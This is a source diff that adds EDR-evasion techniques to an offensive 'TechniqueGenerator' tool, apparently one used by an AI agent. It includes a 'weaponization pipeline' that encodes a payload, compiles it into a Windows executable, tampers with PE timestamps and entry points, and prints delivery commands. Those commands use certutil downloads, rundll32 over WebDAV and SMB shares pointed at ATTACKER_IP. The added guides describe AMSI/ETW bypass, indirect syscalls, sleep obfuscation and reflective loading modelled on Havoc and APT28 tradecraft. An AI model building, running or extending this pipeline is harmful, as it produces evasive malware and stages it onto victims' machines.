@@ -8,6 +8,10 @@
  */
 
 import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'
+import { randomInt, randomBytes } from 'crypto'
+import { readFileSync, existsSync } from 'fs'
+import { join, dirname } from 'path'
+import { fileURLToPath } from 'url'
 
 // ── AMSI bypass templates ──────────────────────────────────────────────────
 
@@ -569,11 +573,14 @@ function apt28OperationalPattern(): string {
 // ── Tool implementation ────────────────────────────────────────────────────
 
 interface TechniqueGeneratorInput {
-  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego' | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack' | 'apt28_dead_drop' | 'apt28_webdav_unc' | 'custom'
+  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego' | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack' | 'apt28_dead_drop' | 'apt28_webdav_unc' | 'compile_binary' | 'indirect_syscall' | 'hwbp_amsi' | 'sleep_obfuscation' | 'reflective_load' | 'custom'
   payload: string
   platform?: 'windows' | 'linux'
   analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
   encoding?: 'base64' | 'hex' | 'xor'
+  evasion_chain?: string[]
+  delivery?: string
+  randomize?: boolean
 }
 
 export class TechniqueGeneratorTool implements Tool {
@@ -608,13 +615,18 @@ export class TechniqueGeneratorTool implements Tool {
 - apt28_com_hijack: COM hijacking persistence via InprocServer32
 - apt28_dead_drop: Dead Drop Resolver — cloud API as C2 channel
 - apt28_webdav_unc: WebDAV UNC path DLL loading without disk landing
+- compile_binary: Full binary weaponization pipeline — shellcode → compile → obfuscate → deliver
+- indirect_syscall: Havoc-style SSN extraction + indirect syscall (zero IAT)
+- hwbp_amsi: Hardware breakpoint AMSI/ETW bypass (Dr0+VEH, no memory patching)
+- sleep_obfuscation: Ekko/Foliage sleep obfuscation — RC4 encrypt image during sleep
+- reflective_load: Reflective DLL loading — in-memory PE parsing + import fixup
 - custom: Custom bypass technique`,
       parameters: {
         type: 'object',
         properties: {
           technique: {
             type: 'string',
-            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'custom'],
+            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'compile_binary', 'indirect_syscall', 'hwbp_amsi', 'sleep_obfuscation', 'reflective_load', 'custom'],
             description: 'Evasion technique type',
           },
           payload: { type: 'string', description: 'Original payload/command/shellcode' },
@@ -629,14 +641,17 @@ export class TechniqueGeneratorTool implements Tool {
             description: 'EnvAnalyzer detection results',
           },
           encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: 'Encoding method (valid for shellcode_encode)' },
+          evasion_chain: { type: 'array', items: { type: 'string' }, description: 'Evasion techniques to combine (for compile_binary)' },
+          delivery: { type: 'string', enum: ['unc_webdav', 'http_server', 'c2_deploy', 'smb_share'], description: 'Delivery method (for compile_binary)' },
+          randomize: { type: 'boolean', description: 'Randomize fingerprint each compile (default: true)' },
         },
         required: ['technique', 'payload'],
       },
     },
   }
 
-  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
-    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput
+  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
+    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor', evasion_chain, delivery, randomize } = input as unknown as TechniqueGeneratorInput
 
     let output = ''
 
@@ -705,6 +720,24 @@ export class TechniqueGeneratorTool implements Tool {
       case 'apt28_com_hijack': output = apt28COMHijacking(); break
       case 'apt28_dead_drop': output = apt28DeadDropResolver(); break
       case 'apt28_webdav_unc': output = apt28WebDAVUNC(); break
+      case 'compile_binary':
+        return this.runWeaponizationPipeline(payload, platform, context, {
+          evasion_chain,
+          delivery_method: delivery,
+          randomize: randomize !== false,
+        })
+      case 'indirect_syscall':
+        output = this.generateIndirectSyscallGuide()
+        break
+      case 'hwbp_amsi':
+        output = this.generateHwBpAmsiGuide()
+        break
+      case 'sleep_obfuscation':
+        output = this.generateSleepObfuscationGuide()
+        break
+      case 'reflective_load':
+        output = this.generateReflectiveLoadGuide()
+        break
       case 'custom':
         output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique.`
         break
@@ -713,6 +746,111 @@ export class TechniqueGeneratorTool implements Tool {
     }
 
     return { content: output, isError: false }
+  }
+
+  // ── Havoc/Sliver-derived technique guides ──
+
+  private generateIndirectSyscallGuide(): string {
+    return `[TechniqueGenerator] 间接 Syscall 指南 (Havoc Demon 风格)
+${'═'.repeat(60)}
+
+## 核心原理
+Windows EDR 通常通过 hook ntdll.dll 中的 syscall 函数来监控行为。
+间接 syscall 绕过这个机制：
+
+1. **SSN 提取**: 扫描 ntdll 中的 "4c 8b d1 b8" 字节模式
+   - 这是 "mov r10,rcx; mov eax,ssn" 指令
+   - 从偏移 +4/+5 处提取 2 字节 SSN
+
+2. **Syscall 地址提取**: 在同一个函数内搜索 "0f 05" (syscall 指令)
+
+3. **Hooked 回退**: 如果目标函数被 hook，扫描相邻 syscall
+   - 向前/向后搜索未 hook 的 syscall
+   - 根据距离推算目标 SSN: Ssn = NeighborSsn ± distance
+
+4. **执行**: inline asm:
+   mov r10, rcx
+   mov eax, [r11 + 0x8]   ; SSN from SYS_CONFIG
+   jmp QWORD [r11]        ; 跳转到 syscall 指令
+
+## 可用的 C 模板
+- shellcode_runner.c — 完整的 PEB walking + SSN 提取 + 间接调用
+- 编译: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables -fno-ident -s -nostdlib
+
+## 优势
+- 零 IAT — 所有 API 通过 PEB walking 解析
+- EDR hook 检测 — 自动绕过被 hook 的函数
+
+## 参考
+- Havoc Demon: payloads/Demon/src/core/Syscalls.c
+- Havoc Demon: payloads/Demon/src/asm/Syscall.x64.asm`
+  }
+
+  private generateHwBpAmsiGuide(): string {
+    return `[TechniqueGenerator] 硬件断点 AMSI/ETW 绕过指南 (Havoc HwBpEngine 风格)
+${'═'.repeat(60)}
+
+## 核心原理
+使用 x86-64 调试寄存器 (Dr0-Dr3) + VEH 实现无痕绕过：
+
+1. **注册 VEH**: RtlAddVectoredExceptionHandler
+2. **设置 Dr0**: Dr0 = AmsiScanBuffer 地址
+3. **启用 Dr7**: Dr7 |= (1 << (2*0)) — 启用 L0
+4. **触发**: EXCEPTION_SINGLE_STEP → 我们的 handler
+5. **Handler**: 设置 RAX=0，跳过函数
+
+## 关键优势 (vs 内存 patch)
+- 不修改任何内存页 — EDR 无法检测
+- 不改变函数代码 — AmsiScanBuffer 字节不变
+- Dr7 设置: Dr7 &= ~(3ull << (16 + 4*Position))
+          Dr7 |= 1ull << (2*Position)
+
+## 可用的 C 模板
+- amsi_etw_bypass.c — 完整的 Dr0+VEH 实现
+
+## 参考
+- Havoc Demon: payloads/Demon/src/core/HwBpEngine.c`
+  }
+
+  private generateSleepObfuscationGuide(): string {
+    return `[TechniqueGenerator] Sleep 混淆指南 (Havoc Foliage/Ekko 风格)
+${'═'.repeat(60)}
+
+## 核心原理
+在 sleep 期间加密内存映像，使 EDR 扫描看到垃圾数据：
+
+1. NtProtectVirtualMemory — 将映像改为 RW
+2. SystemFunction032 (Advapi32 RC4) — 加密整个映像
+3. WaitForSingleObjectEx — sleep (内存全是加密数据)
+4. SystemFunction032 — 解密映像
+5. NtProtectVirtualMemory — 恢复 RX 权限
+
+## 可用的 C 模板
+- sleep_obfuscation.c — 完整的 RC4 加密 sleep 实现
+
+## 参考
+- Havoc Demon: payloads/Demon/src/core/Obf.c`
+  }
+
+  private generateReflectiveLoadGuide(): string {
+    return `[TechniqueGenerator] 反射 DLL 加载指南
+${'═'.repeat(60)}
+
+## 核心原理
+在内存中加载 PE 文件，无需写入磁盘：
+
+1. 解析 PE 头: DOS → NT → Section headers
+2. 分配内存: ImageBase 处分配 SizeOfImage
+3. 复制节区: 按 VirtualAddress 复制到内存
+4. 修复导入表: LoadLibrary + GetProcAddress
+5. 修复重定位: IMAGE_BASE_RELOCATION
+6. 调用 DllMain: entryPoint(DLL_PROCESS_ATTACH)
+
+## 可用的 C 模板
+- reflective_loader.c — 完整的 in-memory PE loader
+
+## 参考
+- Sliver reflector + classic Reflective DLL Injection (stephenfewer)`
   }
 
   private generateAMSI(payload: string, edrType?: string): string {
@@ -775,5 +913,280 @@ export class TechniqueGeneratorTool implements Tool {
 
     lines.push(`Original payload: ${payload}`)
     return lines.join('\n')
+  }
+
+  // ── Full weaponization pipeline ──
+
+  private async runWeaponizationPipeline(
+    payload: string,
+    platform: string,
+    context: ToolContext,
+    opts: { evasion_chain?: string[]; delivery_method?: string; randomize?: boolean },
+  ): Promise<ToolResult> {
+    const lines: string[] = ['[TechniqueGenerator] 二进制武器化管线执行', '═'.repeat(60)]
+
+    // ── Step 0: Select template based on evasion_chain ──
+    const evasionChain = opts.evasion_chain || ['amsi_bypass', 'shellcode_runner']
+    const template = this.selectTemplate(evasionChain, platform)
+
+    lines.push(`  模板: ${template}`)
+    lines.push(`  绕过链: ${evasionChain.join(' + ')}`)
+    lines.push('')
+
+    // ── Step 1: Load template source ──
+    const __dirname = dirname(fileURLToPath(import.meta.url))
+    const srcDir = join(__dirname, 'payloadSources')
+    let source: string | null = null
+
+    for (const ext of ['.c', '.go', '.ps1']) {
+      const path = join(srcDir, `${template}${ext}`)
+      if (existsSync(path)) {
+        source = readFileSync(path, 'utf-8')
+        break
+      }
+    }
+
+    if (!source) {
+      return { content: `[TechniqueGenerator] 模板源码未找到: ${template}`, isError: true }
+    }
+
+    // ── Step 2: Generate shellcode-like payload bytes ──
+    const xorKey = opts.randomize ? randomInt(1, 256) : 0xAB
+    const shellcodeBytes = this.encodeShellcode(payload, xorKey)
+    const encodedBytes = shellcodeBytes.map((b) => b ^ xorKey)
+
+    lines.push('── Step 1: Shellcode 编码 ──')
+    lines.push(`  XOR 密钥: 0x${xorKey.toString(16).toUpperCase().padStart(2, '0')}`)
+    lines.push(`  原始命令: ${payload}`)
+    lines.push(`  编码后: ${encodedBytes.slice(0, 10).map((b) => `0x${b.toString(16).toUpperCase().padStart(2, '0')}`).join(',')}... (${encodedBytes.length} bytes)`)
+    lines.push('')
+
+    // ── Step 3: Replace placeholders ──
+    source = source.replace(/\{\{SHELLCODE_BYTES\}\}/g, encodedBytes.map((b) => `0x${b.toString(16).padStart(2, '0')}`).join(','))
+    source = source.replace(/\{\{SHELLCODE_LEN\}\}/g, String(encodedBytes.length))
+
+    // ── Step 4: Compile if possible ──
+    lines.push('── Step 2: 编译 ──')
+    const compileResult = await this.tryCompile(source, template, context)
+
+    if (compileResult.success && compileResult.outputPath) {
+      lines.push(`  编译成功: ${compileResult.outputPath}`)
+      lines.push(`  文件大小: ${compileResult.fileSize} bytes`)
+
+      // ── Step 5: Obfuscate ──
+      lines.push('')
+      lines.push('── Step 3: 二进制混淆 ──')
+      const obfResult = await this.tryObfuscate(compileResult.outputPath, context)
+
+      if (obfResult.success && obfResult.outputPath) {
+        lines.push(`  混淆成功: ${obfResult.outputPath} (${obfResult.fileSize} bytes)`)
+        if (obfResult.applied) obfResult.applied.forEach((a) => lines.push(`    - ${a}`))
+      } else {
+        lines.push('  (混淆跳过 — pefile 不可用)')
+      }
+
+      // Use obfuscated path if available, otherwise compiled path
+      const finalPath = obfResult.outputPath ?? compileResult.outputPath
+
+      // ── Step 6: Delivery ──
+      lines.push('')
+      lines.push('── Step 4: 投递指令 ──')
+      const deliveryMethod = opts.delivery_method || 'http_server'
+      const deliveryCmds = this.generateDeliveryCommands(finalPath, deliveryMethod)
+      deliveryCmds.forEach((c) => lines.push(`  ${c}`))
+    } else {
+      lines.push(compileResult.error || '编译失败')
+      lines.push('')
+      lines.push('── 源码 (可手动编译) ──')
+      lines.push(source)
+      lines.push('')
+      lines.push('── 编译指令 ──')
+      if (template.endsWith('.c') || (template === 'shellcode_runner' || template === 'amsi_etw_bypass' || template === 'process_inject' || template === 'unhook_loader')) {
+        lines.push('  x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh --gc-sections -s -nostdlib -o payload.exe source.c -lkernel32 -lntdll')
+      } else if (template === 'go_payload') {
+        lines.push('  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o payload.exe source.go')
+      } else if (template === 'ps_amsi_bypass') {
+        lines.push('  powershell -ExecutionPolicy Bypass -File payload.ps1')
+      }
+    }
+
+    lines.push('')
+    lines.push('── 随机指纹 ──')
+    const fingerprint = {
+      xorKey: `0x${xorKey.toString(16).toUpperCase().padStart(2, '0')}`,
+      compileId: randomBytes(4).toString('hex'),
+    }
+    lines.push(`  XOR 密钥: ${fingerprint.xorKey}`)
+    lines.push(`  编译 ID: ${fingerprint.compileId}`)
+
+    return { content: lines.join('\n'), isError: false }
+  }
+
+  // ── Template selection based on evasion chain ──
+  private selectTemplate(chain: string[], platform: string): string {
+    const chainLower = chain.map((c) => c.toLowerCase()).join(' ')
+
+    if (chainLower.includes('sleep') || chainLower.includes('obfuscat') || chainLower.includes('foliage') || chainLower.includes('ekko')) return 'sleep_obfuscation'
+    if (chainLower.includes('reflect') || chainLower.includes('dll')) return 'reflective_loader'
+    if (chainLower.includes('inject') || chainLower.includes('apc')) return 'process_inject'
+    if (chainLower.includes('unhook') || chainLower.includes('refresh')) return 'unhook_loader'
+    if (chainLower.includes('amsi') && chainLower.includes('etw')) return 'amsi_etw_bypass'
+    if (chainLower.includes('amsi') || chainLower.includes('bypass')) return 'amsi_etw_bypass'
+    if (chainLower.includes('go') || chainLower.includes('garble')) return 'go_payload'
+    if (chainLower.includes('powershell') || chainLower.includes('ps')) return 'ps_amsi_bypass'
+
+    return 'shellcode_runner'
+  }
+
+  // ── Encode string to shellcode-like bytes ──
+  private encodeShellcode(text: string, _key: number): number[] {
+    // Convert text to UTF-8 bytes wrapped in a simple stub pattern
+    const bytes = Buffer.from(text, 'utf8')
+    const result: number[] = []
+    for (const b of bytes) {
+      result.push(b)
+    }
+    // Pad to align
+    while (result.length % 4 !== 0) result.push(0)
+    return result
+  }
+
+  // ── Attempt compilation ──
+  private async tryCompile(source: string, template: string, context: ToolContext): Promise<{ success: boolean; outputPath?: string; fileSize?: number; error?: string }> {
+    try {
+      const { exec: execCb } = await import('child_process')
+      const { promisify } = await import('util')
+      const exec = promisify(execCb)
+      const { writeFileSync, mkdirSync, existsSync, statSync } = await import('fs')
+      const { join } = await import('path')
+
+      const tmpDir = join(context.cwd, '.ovovo', 'payload_src')
+      if (!existsSync(tmpDir)) mkdirSync(tmpDir, { recursive: true })
+
+      const compileId = randomBytes(4).toString('hex')
+      const sessionDir = context.sessionDir ?? context.cwd
+
+      if (template.endsWith('.c') || template === 'shellcode_runner' || template === 'amsi_etw_bypass' || template === 'process_inject' || template === 'unhook_loader') {
+        const srcFile = join(tmpDir, `${template}_${compileId}.c`)
+        const outFile = join(sessionDir, `payload_${template}_${compileId}.exe`)
+        writeFileSync(srcFile, source)
+
+        try {
+          await exec(`x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh --gc-sections -s -nostdlib -o "${outFile}" "${srcFile}" -lkernel32 -lntdll`, { timeout: 30_000 })
+          const stats = statSync(outFile)
+          return { success: true, outputPath: outFile, fileSize: stats.size }
+        } catch {
+          return { success: false, error: 'MinGW 编译器不可用。返回完整源码供手动编译。' }
+        }
+      } else if (template === 'go_payload') {
+        const srcFile = join(tmpDir, `${template}_${compileId}.go`)
+        const outFile = join(sessionDir, `payload_${template}_${compileId}.exe`)
+        writeFileSync(srcFile, source)
+
+        try {
+          await exec(`GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "${outFile}" "${srcFile}"`, { timeout: 60_000 })
+          const stats = statSync(outFile)
+          return { success: true, outputPath: outFile, fileSize: stats.size }
+        } catch {
+          return { success: false, error: 'Go 编译器不可用。返回完整源码供手动编译。' }
+        }
+      } else if (template === 'ps_amsi_bypass') {
+        const outFile = join(sessionDir, `payload_${template}_${compileId}.ps1`)
+        writeFileSync(outFile, source)
+        const stats = statSync(outFile)
+        return { success: true, outputPath: outFile, fileSize: stats.size }
+      }
+
+      return { success: false, error: '不支持的模板类型: ' + template }
+    } catch (err) {
+      return { success: false, error: `编译异常: ${(err as Error).message}` }
+    }
+  }
+
+  // ── Attempt obfuscation ──
+  private async tryObfuscate(binPath: string, context: ToolContext): Promise<{ success: boolean; outputPath?: string; fileSize?: number; applied?: string[] }> {
+    try {
+      const { exec: execCb } = await import('child_process')
+      const { promisify } = await import('util')
+      const exec = promisify(execCb)
+      const { randomInt, randomBytes } = await import('crypto')
+      const { existsSync, statSync } = await import('fs')
+
+      // Check if pefile is available
+      try {
+        await exec('python3 -c "import pefile" 2>/dev/null || python -c "import pefile" 2>/dev/null', { timeout: 5_000 })
+      } catch {
+        return { success: false }
+      }
+
+      const sessionDir = context.sessionDir ?? context.cwd
+      const obfName = `payload_obf_${randomBytes(3).toString('hex')}.exe`
+      const obfPath = join(sessionDir, obfName)
+
+      // Copy binary
+      const copyCmd = process.platform === 'win32' ? `copy "${binPath}" "${obfPath}" >nul` : `cp "${binPath}" "${obfPath}"`
+      await exec(copyCmd, { timeout: 5_000 }).catch(() => null)
+
+      const applied: string[] = []
+
+      // Timestamp randomization
+      const ts = Math.floor(new Date(Date.UTC(randomInt(2017, 2024), randomInt(0, 12), randomInt(1, 28), randomInt(0, 23), randomInt(0, 59), randomInt(0, 59))).getTime() / 1000)
+      const tsScript = `import pefile; pe = pefile.PE(r"${obfPath.replace(/\\/g, '\\\\')}"); pe.FILE_HEADER.TimeDateStamp = ${ts}; pe.write(r"${obfPath.replace(/\\/g, '\\\\')}"); print("OK")`
+      try {
+        await exec(`python3 -c "${tsScript}" 2>/dev/null || python -c "${tsScript}" 2>/dev/null`, { timeout: 10_000 })
+        applied.push(`时间戳随机: ${new Date(ts * 1000).toISOString()}`)
+      } catch { /* skip */ }
+
+      // Entry point shift
+      const offset = randomInt(0x100, 0x2000)
+      const epScript = `import pefile; pe = pefile.PE(r"${obfPath.replace(/\\/g, '\\\\')}"); pe.OPTIONAL_HEADER.AddressOfEntryPoint += ${offset}; pe.write(r"${obfPath.replace(/\\/g, '\\\\')}"); print("OK")`
+      try {
+        await exec(`python3 -c "${epScript}" 2>/dev/null || python -c "${epScript}" 2>/dev/null`, { timeout: 10_000 })
+        applied.push(`入口点偏移: +0x${offset.toString(16).toUpperCase()}`)
+      } catch { /* skip */ }
+
+      if (applied.length > 0 && existsSync(obfPath)) {
+        const stats = statSync(obfPath)
+        return { success: true, outputPath: obfPath, fileSize: stats.size, applied }
+      }
+
+      return { success: false }
+    } catch {
+      return { success: false }
+    }
+  }
+
+  // ── Generate delivery commands ──
+  private generateDeliveryCommands(payloadPath: string, method: string): string[] {
+    const fileName = payloadPath.split(/[\\/]/).pop() || 'payload.exe'
+
+    switch (method) {
+      case 'unc_webdav':
+        return [
+          '攻击机: cp ${payloadPath} /tmp/webdav/payloads/',
+          '攻击机: python3 -m wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav --auth=anonymous',
+          `目标: rundll32.exe \\\\ATTACKER_IP\\payloads\\${fileName},EntryPoint`,
+        ]
+      case 'http_server':
+        return [
+          '攻击机: python3 -m http.server 8080',
+          `目标: certutil -urlcache -split -f http://ATTACKER_IP:8080/${fileName} C:\\Users\\Public\\${fileName}`,
+          `目标: start C:\\Users\\Public\\${fileName}`,
+        ]
+      case 'c2_deploy':
+        return [
+          '使用 C2Tool deploy_payload 上传到目标',
+          `Payload 路径: ${payloadPath}`,
+        ]
+      case 'smb_share':
+        return [
+          '攻击机: impacket-smbserver payloads /tmp/smb_share',
+          `目标: \\\\ATTACKER_IP\\payloads\\${fileName}`,
+        ]
+      default:
+        return [
+          `手动将 ${payloadPath} 传输到目标并执行`,
+        ]
+    }
   }
 }
